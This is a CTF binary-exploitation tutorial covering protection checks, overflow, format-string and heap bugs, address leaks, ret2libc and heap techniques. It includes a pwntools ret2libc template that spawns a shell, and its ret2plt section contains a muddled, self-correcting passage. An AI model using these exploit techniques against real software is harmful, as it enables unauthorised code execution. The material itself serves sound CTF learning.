# CTF Pwn Approach — Exploiting Memory Safety Bugs

CTF pwn challenges test your ability to find and exploit memory safety bugs in small binaries. The flow: find the bug, understand the protection, craft the exploit.

## The 5-step CTF pwn loop

1. **Check protections** — NX, PIE, RELRO, canary, FORTIFY
2. **Find the bug** — buffer overflow, format string, use-after-free
3. **Understand the leak** — what address can you leak? what address do you need?
4. **Craft the payload** — ROP chain, ret2libc, ret2csu, ret2dlresolve, ret2plt
5. **Test and iterate** — gdb, pwndbg, scripting

## Step 1: Check protections

```bash
checksec --file=<target>
```

| Protection | What it blocks | Bypass |
|------------|-----------------|--------|
| NX (DEP) | Direct shellcode on stack | ROP, ret2libc |
| PIE / ASLR | Fixed addresses | Leak an address first |
| Canary | Stack overflow detection | Leak or brute the canary |
| Full RELRO | GOT overwrite | Don't use GOT writes; use other primitives |
| Partial RELRO | (default) GOT overwrite still works | ret2plt, GOT overwrite |
| FORTIFY | Some unsafe libc functions | Use unaffected functions |

## Step 2: Find the bug

### Stack buffer overflow

```c
char buf[64];
gets(buf);              // obvious overflow
fgets(buf, 256, stdin); // overflow if size > 64
read(0, buf, 256);      // same
```

In disasm:
- `sub rsp, 0x40` (64-byte buffer)
- `call gets@plt` (unbounded input)

The bug: input can be longer than the buffer, overwriting saved RBP, saved RIP, and beyond.

### Format string

```c
char buf[128];
fgets(buf, 128, stdin);
printf(buf);  // user input as format string!
```

In disasm:
- `lea rdi, [rbp-N]` (user input address — NOT a literal)
- `call printf@plt`

The bug: `%s` reads stack, `%x` leaks stack, `%n` writes stack.

### Heap overflow / use-after-free

```c
char *p = malloc(64);
read(0, p, 256);          // heap overflow
free(p);
read(0, p, 64);            // use-after-free
```

In disasm: `call malloc@plt`, then `call read@plt` with size > malloc'd size. Or `call free@plt` followed by `call read@plt` on the same pointer.

### Integer overflow → buffer overflow

```c
int size;
scanf("%d", &size);
char *buf = malloc(size * 4);  // overflow if size * 4 wraps
read(0, buf, real_size);       // buffer overflow on the small alloc
```

## Step 3: Understanding the leak

If PIE / ASLR is on, you need to leak an address before you can craft the payload.

### Leak via format string

```python
# Send: %p.%p.%p.%p
# Receive: 0x7f... 0x... 0x401234 ...
# Each %p reads the next 8 bytes from the stack
# Find a libc / PIE address in the output
```

Identify which %p leaks which address:
- Stack addresses: usually start with `0x7ff...`
- Libc addresses: `0x7f...` (close to libc base)
- PIE addresses: small numbers around the binary base
- Heap: `0x55...` or `0x5...`

### Leak via OOB read

```python
# Overflow the buffer such that the next "puts(buf)" prints past the buffer
# Read the leaked bytes
```

Common: overflow into a saved RIP, then `puts(buf)` (or printf("%s", buf)) will print the bytes after the buffer — including the saved RIP.

## Step 4: Crafting the payload

### ret2libc (NX on, no PIE)

Stack layout (overflow):

```
[ buffer padding ]
[ saved rbp ]
[ saved rip -> pop rdi; ret gadget ]
[ arg1 = "/bin/sh" address in libc ]
[ system address in libc ]
```

Steps:
1. Find libc version on the target: `ldd <binary>` then look up the libc
2. Find `system` address: `libc base + offset of system`
3. Find "/bin/sh" string: `libc base + offset of "/bin/sh"`
4. Find a `pop rdi; ret` gadget in the binary or libc: `ROPgadget --binary <target> | grep "pop rdi"`
5. Construct the chain

```python
from pwn import *
elf = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./target')

# Leak libc base
p.sendline(b'%p.%p')  # adjust to leak a libc address
leak = parse_leak(p.recv())
libc.address = leak - libc.symbols['puts']  # adjust symbol

# Build ROP chain
pop_rdi = ROP(elf).find_gadget(['pop rdi', 'ret'])[0]
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

payload = b'A' * 72  # buffer + saved rbp
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)
p.interactive()
```

### ret2csu (no useful gadgets in binary)

x86-64 binaries have a `__libc_csu_init` function with useful gadgets for setting rdi, rsi, rdx. Use them when no `pop rdi; ret` is in the binary itself.

### ret2dlresolve (no libc leak, no PIE)

Manually craft a fake `Elf64_Rela` and `Elf64_Sym` to make `dlsym` resolve an arbitrary function. Used when:
- No PIE (so you know the address of GOT / dynamic section)
- No libc leak (so you can't compute addresses)
- Need to call `system("/bin/sh")`

Tools: `pwntools`'s `Ret2dlresolve` class.

### ret2plt (no libc leak, partial RELRO)

Call `printf@plt` with format string args to leak GOT entries, then call `system` with `/bin/sh`.

```
[ overflow ]
[ pop rdi; ret ]
[ "/bin/sh" address as plt arg ]
[ printf@plt ]  -> leaks nothing useful here actually
```

Actually, ret2plt usually means: call `puts@plt(got_entry_of_libc_func)` to leak libc, then return to main, then ret2libc with the leak.

## Heap exploitation

For heap challenges (glibc):

### Fastbin dup (glibc < 2.32)

Double-free a fastbin chunk to get the same chunk allocated twice, then overwrite its `fd` pointer to make `malloc` return an arbitrary address.

Steps:
1. Allocate chunks A, B, C (size in fastbin range, e.g., 0x40)
2. Free A, B, A (the third free is the bug — usually a UAF or double free)
3. Now the fastbin freelist is: A -> B -> A
4. Allocate A — same chunk returns
5. Allocate B
6. Allocate A again — same chunk returns, write target address into `fd`
7. Allocate — fastbin now has target address at the head
8. Allocate — returns target address!

### Tcache poisoning (glibc 2.26+)

Same idea but using tcache. Easier than fastbin (no double-free check until 2.34).

### House of Spirit

Free a fake chunk at a target address; subsequent malloc returns that address.

### House of Force

Overflow a top chunk size, then malloc a huge size to make the top chunk wrap around to a target address.

### House of Roman

Use unsorted bin + fastbin to leak libc and overwrite `__malloc_hook` without needing a leak.

For modern glibc (2.34+), `__malloc_hook`, `__free_hook`, `__realloc_hook` are gone. Use `_IO_FILE` exploitation (House of Apple, etc.) instead.

## Stack pivoting

When you have a tiny overflow (e.g., 16 bytes — just saved RBP + saved RIP), you can't fit a full ROP chain. Instead:

1. Pivot the stack to a region you control (e.g., the buffer itself, or BSS)
2. Run the ROP chain from there

Common gadgets: `leave; ret` (sets RSP = RBP, pops RBP) — chain these to move the stack pointer to your buffer.

## Scripting essentials

```python
from pwn import *

context.binary = './target'
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

p = process('./target')  # local
# p = remote('host', port)  # remote

# GDB attach
gdb.attach(p, '''
b *main+42
c
''')

# Send
p.sendline(b'A' * 64)

# Receive until marker
p.recvuntil(b'Enter input: ')

# Pack
p64(0xdeadbeef)  # 64-bit little-endian

# Interactive mode (when you have shell)
p.interactive()
```

## Time budget

| Pattern | Time |
|---------|------|
| Simple overflow, no PIE, NX on | 30 min (ret2libc) |
| Format string leak + ROP | 1 hour |
| Heap double-free, libc 2.31 | 1.5 hours |
| Modern glibc 2.34+ heap | 2-3 hours |
| VM / complex state machine | 3-5 hours |

## Output

The deliverable for a CTF pwn challenge is the flag (or shell). The report should include:
- Challenge name
- Binary type / arch / protections
- Bug identified (overflow / format / UAF / etc.)
- Leak method
- Exploit technique (ret2libc / fastbin / tcache / etc.)
- The flag (or `id` output)
- The exploit script (pwntools)
